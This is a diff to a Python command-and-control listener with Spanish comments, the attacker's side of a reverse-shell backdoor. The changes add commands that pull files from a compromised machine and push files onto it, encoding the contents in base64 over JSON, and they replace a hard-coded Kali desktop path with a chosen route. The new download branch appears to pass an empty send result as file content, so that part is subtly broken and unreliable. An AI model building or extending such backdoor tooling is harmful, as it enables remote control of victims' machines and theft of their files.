@@ -19,7 +19,7 @@ class Listener:
 
         print('Servidor inicializado, esperando por conexiones')
         self.connection, address = listener.accept() #Aceptar conexiones
-        print(f'[+] Conexión establecida con {address}\n')
+        print(f'[+]Conexión establecida con {address}\n')
 
     #Es importante mantener una integridad de los datos, 
     #es decir, asegurarnos de que ningún paquete se pierda durante la comunicación
@@ -27,7 +27,7 @@ class Listener:
     #Codificación json:
     def reliableSend(self, data):
         if isinstance(data, bytes):
-            jsonData = json.dumps(data.decode('utf-8', 'replace'))            
+            jsonData = json.dumps(data.decode(errors= 'replace'))            
         else:
             jsonData = json.dumps(data)
 
@@ -47,13 +47,23 @@ class Listener:
             except ValueError: 
                 print('Está ocurriendo un error')
                 continue'''
-            jsonData = self.connection.recv(8192)                
+            jsonData = self.connection.recv(4096)                
             return json.loads(jsonData)
 
-    def writeFile(self, path, content):
-        with open(f'/home/kali/Desktop/{path}', 'wb') as file:
-            file.write(base64.b64decode(content))
-            return '[+] Descarga completa'
+    def writeFile(self, path, route, content):
+        contentToWrite = base64.b64decode(content)
+        if contentToWrite != b'[-]Archivo no encontrado':
+            with open(f'{route}{path}', 'wb') as file:
+                file.write(contentToWrite)
+                return '[+]Descarga completa'
+        else: return '[-]Descarga fallida'
+
+    def readFile(self, path):
+        try:
+            with open(path, 'rb') as file:
+                return base64.b64encode(file.read())
+        except FileNotFoundError:
+            return base64.b64encode(b'[-]Archivo no encontrado')
     
     def remoteAction(self, command):
         self.reliableSend(command)
@@ -66,11 +76,20 @@ class Listener:
     def run(self):
             while True:
                 command = input('>>')
-                command = command.split(' ')
-                result = self.remoteAction(command)
+                command = command.split(' ')                
 
-                if command[0] == 'descargar':
-                    result = self.writeFile(' '.join(command[1:]), result)
+                if command[0] == 'down':
+                    contentFile = self.reliableSend(command)
+                    result = self.writeFile(' '.join(command[2:]), command[1], contentFile)
+
+                elif command[0] == 'up':
+                    contentFile = self.readFile(' '.join(command[2:]))
+                    #command[0]=comando, command[1]=ruta, command[2:]=nombre del archivo
+                    command = [command[0], contentFile.decode('utf-8', 'replace'), command[1], ' '.join(command[2:])]
+                    result = self.remoteAction(command)
+
+                else:
+                    result = self.remoteAction(command)
 
                 print(result)
 
